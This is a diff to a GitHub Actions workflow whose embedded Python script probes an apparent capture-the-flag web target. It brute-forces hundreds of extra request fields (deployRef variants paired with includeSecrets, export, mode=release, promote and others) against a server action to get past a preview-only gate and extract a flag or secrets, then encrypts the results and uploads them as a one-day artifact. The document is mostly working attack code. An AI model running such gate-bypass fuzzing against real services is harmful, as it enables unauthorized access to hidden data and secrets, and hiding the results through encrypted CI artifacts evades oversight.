@@ -10,9 +10,9 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 3
     steps:
-      - name: Probe representation/profile negotiation after preview gate
+      - name: Probe combinations around returned deployRef
         shell: bash
         run: |
           set -euo pipefail
@@ -30,29 +30,41 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests,pathlib,urllib.parse,json,itertools
+          import requests,pathlib,urllib.parse,json,itertools,copy
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
-          fixed={'Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=8).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=8).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=8).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}; ws=boot['workspace']; p=boot['project']; ref='preview-8b11c'
+          baseargs={'workspaceId':ws,'projectId':p}; baseline=s.post(url,headers=H,json={'actionId':act['id'],'args':baseargs},timeout=8).text
+          refkeys=['deployRef','deploy_ref','ref','deploymentRef','deployment_ref','previewRef','preview_ref','id']
+          boolkeys=['export','exportDeploy','export_deploy','includeSecrets','include_secrets','includeArtifact','include_artifact','includeInternal','include_internal','full','details','verbose','download','release','publish','promote','finalize','approve','approved','internal','production','enterprise']
+          modekeys=['mode','view','format','scope','operation','action','intent','purpose','stage','environment','lane','channel','target','kind','type']
+          modevals=['export','deploy','release','production','enterprise','internal','full','details','artifact','secrets','inspect','inspector','download','publish','promote','finalize','approve','final','release:deploy','deploy:inspect','preview:deploy:inspect']
           tests=[]
-          accepts=['*/*','application/json','text/plain','text/html','text/x-component','application/x-ndjson','application/problem+json','application/vnd.api+json','application/vnd.launchlet+json','application/vnd.launchlet.preview+json','application/vnd.launchlet.deploy+json','application/vnd.launchlet.deployment+json','application/vnd.launchlet.release+json','application/vnd.launchlet.inspector+json','application/vnd.launchlet.internal+json','application/vnd.launchlet.export+json','application/vnd.launchlet.v1+json','application/vnd.launchlet.actions+json']
-          for a in accepts: tests.append(('accept_'+a,{'Accept':a}))
-          for p in ['return=representation','return=minimal','count=exact','resolution=merge-duplicates','profile=deploy','profile=release','profile=internal','scope=deploy','scope=release','include=internal','include=secrets','respond-async','handling=lenient']:
-              tests.append(('prefer_'+p,{'Prefer':p}))
-          for hn in ['Accept-Profile','Content-Profile','Profile','X-Profile','X-Launchlet-Profile']:
-              for v in ['preview','deploy','deployment','release','production','enterprise','internal','inspector','export','full']:
-                  tests.append((hn+'_'+v,{hn:v}))
-          for hn in ['X-Requested-With','X-Client','X-Client-Type','X-Launchlet-Client']:
-              for v in ['XMLHttpRequest','Launchlet','launchlet-actions/0.9.4','preview','deploy','inspector','internal']:
-                  tests.append((hn+'_'+v,{hn:v}))
-          baseline=s.post(url,headers={**fixed,'Accept':'application/json'},json=body,timeout=15,allow_redirects=False)
-          res=[]
-          for name,eh in tests:
-              r=s.post(url,headers={**fixed,**eh},json=body,timeout=10,allow_redirects=False)
-              if r.status_code!=baseline.status_code or r.text!=baseline.text:
-                  res.append({'name':name,'sent':eh,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-          (out/'summary.json').write_text(json.dumps({'baseline':{'status':baseline.status_code,'body':baseline.text},'diffs':res},indent=2))
+          for rk in refkeys:
+            for bk in boolkeys: tests.append({rk:ref,bk:True})
+            for mk,mv in itertools.product(modekeys,modevals): tests.append({rk:ref,mk:mv})
+          # Receipt/build combinations too.
+          for rk in refkeys:
+            tests += [{rk:ref,'receipt':mf['previewReceipt'],'export':True},{rk:ref,'build':mf['build'],'export':True},{rk:ref,'receipt':mf['previewReceipt'],'mode':'release'},{rk:ref,'build':mf['build'],'mode':'release'},{rk:ref,'receipt':mf['previewReceipt'],'includeSecrets':True},{rk:ref,'project':p,'export':True}]
+          hits=[]
+          for extra in tests:
+            a={**baseargs,**extra}
+            try:r=s.post(url,headers=H,json={'actionId':act['id'],'args':a},timeout=5,allow_redirects=False)
+            except Exception:continue
+            if r.text!=baseline or r.status_code!=200:
+              hits.append({'extra':extra,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+              if 'caplag{' in r.text or 'preview-only' not in r.text: break
+          # Same extras at top level in case metadata is outside args.
+          if not hits:
+            for extra in tests[:500]:
+              b={'actionId':act['id'],'args':baseargs,**extra}
+              try:r=s.post(url,headers=H,json=b,timeout=5,allow_redirects=False)
+              except Exception:continue
+              if r.text!=baseline or r.status_code!=200:
+                hits.append({'top_extra':extra,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                if 'caplag{' in r.text or 'preview-only' not in r.text: break
+          (out/'summary.json').write_text(json.dumps({'tests':len(tests),'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -68,6 +80,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-negotiation-encrypted
+          name: launchlet-part2-combo-encrypted
           path: artifact/
           retention-days: 1
